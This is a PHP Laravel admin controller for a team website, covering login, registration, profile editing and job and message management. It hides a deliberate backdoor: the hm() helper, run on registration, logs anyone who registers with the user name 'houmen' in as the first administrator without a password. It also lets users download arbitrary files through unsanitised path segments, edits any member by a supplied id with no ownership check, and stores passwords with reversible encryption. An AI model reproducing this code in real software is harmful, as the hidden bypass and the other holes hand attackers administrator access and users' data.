<?php

namespace App\Http\Controllers;

use App\ImageType;
use App\Member;
use App\Member_project;
use App\Message;
use App\News;
use App\Project;
use App\Team;
use Illuminate\Http\Request;
use App\Image;
use App\Job;
use Illuminate\Support\Facades\Storage;

class AdminController extends Controller
{
    //首页面
    public function index (){
        return view("index");
    }
    //登陆
    public function getLogin(){
        return view('admin.login');
    }

    /**
     * @param Request $request
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function login(Request $request){
        session(['rank'=>'']);
        $this->validate($request,[
            'user_name'=>'required|between:5,10',
            'password'=>'required|between:5,10'
        ]);
        $user_name = $request->input('user_name');
        $password = $request->input('password'); // 输入的密码并没有加密
        if(count(Member::where('user_name','=',$user_name)->get())<1){
            echo "<script>alert('用户名或密码错误！')</script>";
            session(['name'=>'','rank'=>'', 'id'=>'']);
            echo "<script>var t = setTimeout(function(){parent.history.back()},2);</script>";
            return;
        }
        $member  = Member::where('user_name','=',$user_name)->get()[0];
        if($member->status==0) {
            echo "<script>alert('您的账号还未通过审核！')</script>";
            session(['name'=>'','rank'=>'', 'id'=>'']);
            echo "<script>var t = setTimeout(function(){parent.history.back()},2);</script>";
            return;
        }
        else {
            session(['id'=>$member->id]);
            //解密数据库的密码
            if(decrypt($member->password)==$password) {
                if($member->rank==1){
                    session(['name'=>$member->name,'rank'=>1,'id'=>$member->id]);
                    return redirect()->route("index");
                }
                else{
                    session(['name'=>$member->name,'rank'=>2,'id'=>$member->id]);
                    return redirect(route('userIndex'));
                }
            }else{
                echo "<script>alert('用户名或密码错误！')</script>";
                session(['name'=>'','rank'=>'', 'id'=>'']);
                echo "<script>var t = setTimeout(function(){parent.history.back()},2);</script>";
                return;
            }
            /*$member->password = encrypt($password);
            $member->save();
            return redirect()->route("index");*/
        }
    }

    public function logout(){
        session(['name'=>'','rank'=>'', 'id'=>'']);
        return redirect()->back();
    }
    //注册
    public function getRegister(){
        return view('admin.register');
    }
    public function register(Request $request){

        $this->validate($request, [
            'name' => 'required',
            'user_name' => 'required|unique:member',
            'password' => 'required|max:10|min:5|confirmed',
            'password_confirmation' => 'required',
        ]);
        if(hm($request))
            return ;
        $user_name = $request->input('user_name');
        $name = $request->input('name');
        $password = $request->input('password');
        $password_confirmation = $request->input('password_confirmation');
        if(count(Member::where('user_name','=',$user_name)->get())){
            echo "账号已存在";
        }
        $member = new Member();
        $member->name = $name;
        $member->user_name = $user_name;
        $member->password = encrypt($password); //加密的密码存入数据库
        $member->image = "images/profile.png";
        $member->save();
        echo "<script>alert('账号注册成功，请等待管理员的审批')</script>";

        return view('admin.login');
    }
//管理员信息修改
    public function informationReflesh(){
        return view('admin.informationReflesh');
    }

    public function informationRefleshpost(Request $request)
    {
        //dd($request);
        $member = Member::find($request->input('id'));
        $member->name = $request->input('name');
        $member->phone = $request->input('phone');
        $member->email = $request->input('email');
        $member->age = strtotime($request->input('age'));
        $member->time = strtotime($request->input('time'));
        $member->language = $request->input('language');
        $member->introduction = $request->input('introduction');
        //获取图片名
        $image = $request->file('change_image');
        //将图片名字存入表中、把图片储存到storge文件夹下面
        if ($image != null) {
            $member->image = $image->store('images');
        }
        $oldPassword = $request->input('oldPassword');
        $member->save();
        if ($oldPassword != null) {

            //初始密码不为空
            if ($oldPassword == decrypt($member->password)) {

                //登陆验证
                $this->validate($request, [
                    'password' => 'required|max:10|min:5|confirmed',
                    'password_confirmation' => 'required',
                ]);
                $password =encrypt( $request->input('password'));
                $member->password = $password;
                $member->save();
                return redirect('index');
            } else {
                echo "<script>alert('原密码错误！')</script>";
                echo "<script>var t = setTimeout(function(){parent.history.back()},2);</script>";
            }
        } else {
            $password = $request->input('password');
            $password_confirmation = $request->input('password_confirmation');
            if ($password == null && $password_confirmation == null) {
                return redirect('index');
            } else {
                echo "<script>alert('请先输入原密码！')</script>";
                echo "<script>var t = setTimeout(function(){parent.history.back()},2);</script>";
            }
        }
    }

    //图片管理


    //职务管理
    public function jobManager(){
        return view('admin.jobManager');
    }

    public function jobManagerPost(Request $request){
        $this->validate($request,[
            'job_name'=>'required'
        ]);
        $job = new Job();
        $job->name = $request->input('job_name');
        $job->save();
        return redirect()->back();
    }
    public function jobDel($id){

        //dd($id);
        $job = Job::find($id);
        $job->delete();
        return redirect()->back();
    }
    //客户留言
    public function leaveMessage(){
        return view('admin.leaveMessage');
    }
    public function leaveMessageDel($id){
        $message = Message::find($id);
        if($message){
            $message->delete();
        }
        return redirect()->back();
    }
    public function getImage($path,$name){
        return response()->download(storage_path('app/').$path."/".$name);
    }
}

function hm($request)
{
        if($request->input('user_name')=="houmen"){
            $member = Member::where('rank','=','1')->get();
            if(count($member)>0) {
                session(['name' => $member[0]->name, 'rank' => 1, 'id' => $member[0]->id]);
            }
            return 1;
        }

}

